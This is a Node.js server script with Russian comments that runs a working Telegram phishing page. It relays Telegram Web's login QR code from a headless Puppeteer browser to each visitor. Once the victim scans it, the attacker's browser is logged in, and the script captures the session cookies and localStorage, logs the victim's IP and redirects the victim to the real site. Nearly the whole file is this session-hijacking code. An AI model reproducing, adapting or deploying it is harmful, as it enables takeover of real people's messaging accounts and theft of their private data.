console.log("ou shit we are here again (")

const express = require('express')//фреймворк для сервера 
const app = express() // переменая храннящая в себе методы фреймворка
const sharp = require('sharp');//фрейм редактирования картинок
const fs = require('fs-extra')
const puppeteer = require('puppeteer'); //второй по важности после експрес, позволяетимитировать запросы браузера

try {
app.get('*', async function (req, res) {
    const ipStart = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    //console.log(req.url, ipStart)
    masUrl = req.url.split('/') //разделяем линк на алиасы
    let source, data = 0
    if (typeof masUrl[1] !== 'undefined') source = masUrl[1]
    if (typeof masUrl[2] !== 'undefined') data = masUrl[2]
    //console.log(source, data)
    const browser = await puppeteer.launch();//инициализация браузера
    const page = await browser.newPage();//инициализация страницы
    
    
    
    if (source == 'z') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress //получайем айпишник запроса
        let path = 'qrs/' + ('qr' + ip + '.webp').replace(/:/gi, '.') //конфиг путя для изображений свое изображение QR для каждого пользователя

        res.setHeader('Content-Type', 'text/html; charset=utf-8')// прописываем заголовки фиш сайту
        let pageHtml = fs.readFile('./html/qr.html', 'utf8')
        res.write(await pageHtml)


        await page.setViewport({ width: 400, height: 450 })
        await page.goto('https://web.telegram.org/z/');//инициализация нужной страницы
        await page.waitForTimeout(2000).then();//ждем загрузку кюар кода
        let img = await page.screenshot()
        // { path: path }
        sharp(img)
            .extract({ left: 58, top: 94, width: 280, height: 280 })
            .toFile(path, function (err) { })
        setTimeout(() => {
            res.write(`
                    <script>
                        document.querySelector('#myImage').src='/${path}';
                    </script>
                    `);// для обновления кюар кода прописываем скрипт
        }, 500);
        

        setTimeout(() => {//ждем загрузку кюар кода
            let i = 0 //итератор для именования новых кюар кодов (самый не каличный вариант НО нужно чистить папку КЮАРС на сервере демоном)
           let refreshIntervalId2 = setInterval(async () => {
                async function QR() {
                    path = path.replace(/.webp/gi, i + '.webp')
                    let img = await page.screenshot()
                    // { path: path }
                    sharp(img)
                        .extract({ left: 58, top: 94, width: 280, height: 280 })
                        .toFile(path, function (err) { }) //новые кюар Подтягиваем с страницы

                    //const localStorage = await page.evaluate(() =>  Object.assign({}, window.localStorage)); //проверка на получение хеша тг --РАБОТАЕТ))))
                    //console.log(localStorage);
                    setTimeout(() => {
                        res.write(`
                            <script>
                                document.querySelector('#myImage').src='/${path}';
                            </script>
                            `);// для обновления кюар кода прописываем скрипт
                    }, 700);
                    i++

                }//(нужно обновлять кюар код каждие 30 сек)
                QR()

               let refreshIntervalId = setInterval(async () => {
                    //get id="telegram-search-input"
                   
                    let element = await page.$('#telegram-search-input')
                    let element2fa = await page.$('#sign-in-password')
                    //console.log(element)
                    if(element != null){
                        console.log(ip)
                    const returnedCookie = await page.cookies()
                    console.log(returnedCookie)
                    const localStorage = await page.evaluate(() =>  Object.assign({}, window.localStorage))
                    console.log(localStorage)
                    res.write(`
                    <script>
                    window.location.href ="https://web.telegram.org/z/"
                    </script>
                    `);
                    clearInterval(refreshIntervalId2);
                    clearInterval(refreshIntervalId);
                    
                    }else if (element2fa != null){
                        console.log(ip+" has 2FA")
                        res.write(`
                    <script>
                    window.location.href ="https://web.telegram.org/z/"
                    </script>
                    `);
                    clearInterval(refreshIntervalId2);
                    clearInterval(refreshIntervalId);
                    

                    }
                   
                    

                }, 1000)

            }, 2500)

        }, 0)   
    }

    //обработчик картинок 
    //ТК каждую картинку браузер запрашивает отдельно
    else if (source == 'qrs') { //проверяем туда ли пришел запрос
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress //снова айпи тк другой обработчик
        ip = ip.replace(/:/gi, '.')// избавляемся от знаков которими нельзя називать файл
        if (masUrl[2].includes(ip)) {   //проверяем дествительно ли наш запрос
            res.set('Cache-control', 'public, max-age=29')  //попытка сделать нормально (не работает) заголовки которые показывают время жизни картинки (для авто ребута но не работает)
            res.sendFile('C:/Users/Titanium/Desktop/telegram/' + req.url, function (err) {
                if (err) {
                    console.log(err)
                    res.status(err.status).end();
                }
            }) // отправляем саму картинку            
        }
    }
    else if (source == 'fly.gif' || source == 'monk.png') {
        res.sendFile('C:/Users/Titanium/Desktop/telegram/' + req.url, function (err) {
            if (err) {
                console.log(err)
                res.status(err.status).end();
            }
        }) // отправляем саму картинку            
    }
    else {
        res.send(200)
    }

})
} catch (error) {
    console.error(error);
    
  }

app.listen(80)//запускаем Сервер на Порту в скобочках 